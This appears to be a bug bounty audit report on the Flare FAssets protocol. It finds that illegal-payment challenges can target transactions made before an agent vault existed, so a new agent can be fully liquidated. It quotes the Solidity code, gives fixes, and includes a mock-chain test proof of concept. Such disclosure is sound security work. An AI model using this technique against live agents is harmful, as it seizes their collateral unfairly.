# #46953 \[SC-High] agents who create agents with prior transactions can be instantly unfairly liquidated

## #46953 \[SC-High] AGENTS WHO CREATE AGENTS WITH PRIOR TRANSACTIONS CAN BE INSTANTLY UNFAIRLY LIQUIDATED

**Submitted on Jun 6th 2025 at 16:14:01 UTC by @io10 for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46953
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/library/AgentsCreateDestroy.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

### Brief/Intro

The FAsset system allows agents to be created with underlying addresses on the target chain. While the system correctly prevents counting incoming payments (top-ups) made before an agent's creation, it fails to apply the same protection to outgoing transactions in the challenge mechanism. This inconsistency creates a critical vulnerability where agents can be unfairly liquidated for transactions that occurred before they were created.

### Vulnerability Details

AgentsCreateDestroy::createAgentVault allows whitelisted agents to create agents under an asset manager in the FAsset system. The function allows agent creation with any valid underlying address on the target chain. See below:

```solidity
 function createAgentVault(
        IIAssetManager _assetManager,
        IAddressValidity.Proof calldata _addressProof,
        AgentSettings.Data calldata _settings
    )
        internal
        returns (address)
    {
        AssetManagerState.State storage state = AssetManagerState.get();
        // reserve suffix quickly to prevent griefing attacks by frontrunning agent creation
        // with same suffix, wasting agent owner gas
        _reserveAndValidatePoolTokenSuffix(_settings.poolTokenSuffix);
        // can be called from management or work owner address
        address ownerManagementAddress = _getManagementAddress(msg.sender);
        // management address must be whitelisted
        Agents.requireWhitelisted(ownerManagementAddress);
        // require valid address
        TransactionAttestation.verifyAddressValidity(_addressProof);
        IAddressValidity.ResponseBody memory avb = _addressProof.data.responseBody;
        require(avb.isValid, "address invalid");
        // create agent vault
        IAgentVaultFactory agentVaultFactory = IAgentVaultFactory(Globals.getSettings().agentVaultFactory);
        IIAgentVault agentVault = agentVaultFactory.create(_assetManager);
        // set initial status
        Agent.State storage agent = Agent.getWithoutCheck(address(agentVault));
        assert(agent.status == Agent.Status.EMPTY);     // state should be empty on creation
        agent.status = Agent.Status.NORMAL;
        agent.ownerManagementAddress = ownerManagementAddress;
        // set collateral token types
        agent.setVaultCollateral(_settings.vaultCollateralToken);
        agent.poolCollateralIndex = state.poolCollateralIndex;
        // set initial collateral ratios
        agent.setMintingVaultCollateralRatioBIPS(_settings.mintingVaultCollateralRatioBIPS);
        agent.setMintingPoolCollateralRatioBIPS(_settings.mintingPoolCollateralRatioBIPS);
        // set minting fee and share
        agent.setFeeBIPS(_settings.feeBIPS);
        agent.setPoolFeeShareBIPS(_settings.poolFeeShareBIPS);
        agent.setBuyFAssetByAgentFactorBIPS(_settings.buyFAssetByAgentFactorBIPS);
        // claim the underlying address to make sure no other agent is using it
        // for chains where this is required, also checks that address was proved to be EOA
        state.underlyingAddressOwnership.claimAndTransfer(ownerManagementAddress, address(agentVault),
            avb.standardAddressHash, Globals.getSettings().requireEOAAddressProof);
        // set underlying address
        agent.underlyingAddressString = avb.standardAddress;
        agent.underlyingAddressHash = avb.standardAddressHash;
        uint64 eoaProofBlock = state.underlyingAddressOwnership.underlyingBlockOfEOAProof(avb.standardAddressHash);
        agent.underlyingBlockAtCreation = SafeMath64.max64(state.currentUnderlyingBlock, eoaProofBlock + 1);
        // add collateral pool
        agent.collateralPool = _createCollateralPool(_assetManager, address(agentVault), _settings);
        // run the pool setters just for validation
        agent.setPoolExitCollateralRatioBIPS(_settings.poolExitCollateralRatioBIPS);
        agent.setPoolTopupCollateralRatioBIPS(_settings.poolTopupCollateralRatioBIPS);
        agent.setPoolTopupTokenPriceFactorBIPS(_settings.poolTopupTokenPriceFactorBIPS);
        // handshake type
        agent.setHandshakeType(_settings.handshakeType);
        // add to the list of all agents
        agent.allAgentsPos = state.allAgents.length.toUint32();
        state.allAgents.push(address(agentVault));
        // notify
        _emitAgentVaultCreated(ownerManagementAddress, address(agentVault), agent.collateralPool,
            avb.standardAddress, _settings);
        return address(agentVault);
    }

```

Keep in mind that the only check present here makes sure that the underlying address is valid and contains no checks on whether the address contains previous transactions or not. This means that the system allows addresses that have a transaction history to be used as underlying addresses for agents. This is further confirmed in UnderlyingBalance::confirmTopupPayment which contains the following check:

```solidity
 require(_payment.data.responseBody.blockNumber >= agent.underlyingBlockAtCreation,
            "topup before agent created");
```

This check means that the protocol are aware and accept that underlying addresses with a transaction history can be used to create agents. The issue arises via Challenges::illegalPaymentChallenge which is a function that allows challengers to liquidate users who make payments from the underlying address without a payment reference AFTER the agent has been initialized. See below:

```solidity
 function illegalPaymentChallenge(
        IBalanceDecreasingTransaction.Proof calldata _payment,
        address _agentVault
    )
        internal
    {
        AssetManagerState.State storage state = AssetManagerState.get();
        Agent.State storage agent = Agent.get(_agentVault);
        // if the agent is already being fully liquidated, no need for more challenges
        // this also prevents double challenges
        require(agent.status != Agent.Status.FULL_LIQUIDATION, "chlg: already liquidating");
        // verify transaction
        TransactionAttestation.verifyBalanceDecreasingTransaction(_payment);
        // check the payment originates from agent's address
        require(_payment.data.responseBody.sourceAddressHash == agent.underlyingAddressHash,
            "chlg: not agent's address");
        // check that proof of this tx wasn't used before - otherwise we could
        // trigger liquidation for already proved redemption payments
        require(!state.paymentConfirmations.transactionConfirmed(_payment), "chlg: transaction confirmed");
        // check that payment reference is invalid (paymentReference == 0 is always invalid payment)
        bytes32 paymentReference = _payment.data.responseBody.standardPaymentReference;
        if (paymentReference != 0) {
            if (PaymentReference.isValid(paymentReference, PaymentReference.REDEMPTION)) {
                uint256 redemptionId = PaymentReference.decodeId(paymentReference);
                Redemption.Request storage redemption = state.redemptionRequests[redemptionId];
                // Redemption must be for the correct agent and
                // only statuses ACTIVE and DEFAULTED mean that redemption is still missing a payment proof.
                // We do not check for timestamp of the payment, because on UTXO chains legal payments can be
                // delayed by arbitrary time due to high fees and cannot be canceled, which could lead to
                // unnecessary full liquidations.
                bool redemptionActive = redemption.agentVault == _agentVault
                    && (redemption.status == Redemption.Status.ACTIVE ||
                        redemption.status == Redemption.Status.DEFAULTED);
                require(!redemptionActive, "matching redemption active");
            }
            if (PaymentReference.isValid(paymentReference, PaymentReference.ANNOUNCED_WITHDRAWAL)) {
                uint256 announcementId = PaymentReference.decodeId(paymentReference);
                // valid announced withdrawal cannot have announcementId == 0 and must match the agent's announced id
                // but PaymentReference.isValid already checks that id in the reference != 0, so no extra check needed
                require(announcementId != agent.announcedUnderlyingWithdrawalId, "matching ongoing announced pmt");
            }
        }
        // start liquidation and reward challengers
        _liquidateAndRewardChallenger(agent, msg.sender, agent.mintedAMG);
        // emit events
        emit IAssetManagerEvents.IllegalPaymentConfirmed(_agentVault, _payment.data.requestBody.transactionId);
    }

```

Challenges can be made to agents that have just been created that have any outgoing transactions which should not be allowed given that these transactions were made before the agent was created. UnderlyingBalance::confirmTopupPayment makes sure any previous payments prior to agent creation are not included in the fAsset internal accounting but any outgoing payments from the underlying address are not stopped from being challenged. As a result, fresh agents can immediately be liquidated unfairly.

### Impact Details

Unfair Liquidations: Agents can be liquidated for transactions they had no control over, as these transactions occurred before the agent was created. This is particularly problematic because:

* The agent has no way to prevent these liquidations
* The agent's collateral can be seized for actions they didn't commit

Financial Losses: The impact extends to direct financial losses:

* Agents lose their deposited collateral
* Legitimate agents may be discouraged from participating

### Recommendations

* Add a check in the agent creation process to verify the underlying address has no outgoing transactions
* Add validation in the agent creation process to ensure the underlying address is "clean"
* Implement a mechanism to track and verify the transaction history of underlying addresses

### Proof of Concept

## Proof Of Code

```javascript

 static async createTest1(ctx: AssetContext, ownerAddress: string, underlyingAddress: string, receiverAddress: string, options?: AgentCreateOptions): Promise<[Agent, string]> {
        if (!(ctx.chain instanceof MockChain)) assert.fail("only for mock chains");
        // mint some funds on underlying address (just enough to make EOA proof)
        if (ctx.chainInfo.requireEOAProof) {
            ctx.chain.mint(underlyingAddress, ctx.chain.requiredFee.addn(1));
        }
        // create mock wallet
        const wallet = new MockChainWallet(ctx.chain);

        const txHash = await wallet.addTransaction(underlyingAddress, receiverAddress, 1, null); //c for testing purposes

        // complete settings
        const settings = createTestAgentSettings(options?.vaultCollateralToken ?? ctx.usdc.address, options);
        return [await Agent.create(ctx, ownerAddress, underlyingAddress, wallet, settings), txHash];
    }


 it("unfair liquidation on transactions made before agent was created", async () => { //c for testing purposes

            const [agent, txHash1] = await Agent.createTest1(context, agentOwner1, underlyingAgent1, minterAddress1);

            const challenger = await Challenger.create(context, challengerAddress1);
            // make agent available
            const fullAgentCollateral = toWei(3e8);
            await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
            // update block
            await context.updateUnderlyingBlock();


          const proof1 = await context.attestationProvider.proveBalanceDecreasingTransaction(txHash1, underlyingAgent1);

            //c challenge is successful even though the transaction was made before the agent was created
            await challenger.illegalPaymentChallenge(agent, txHash1);

            await agent.checkAgentInfo({ status: AgentStatus.FULL_LIQUIDATION }, "reset");

        });
```
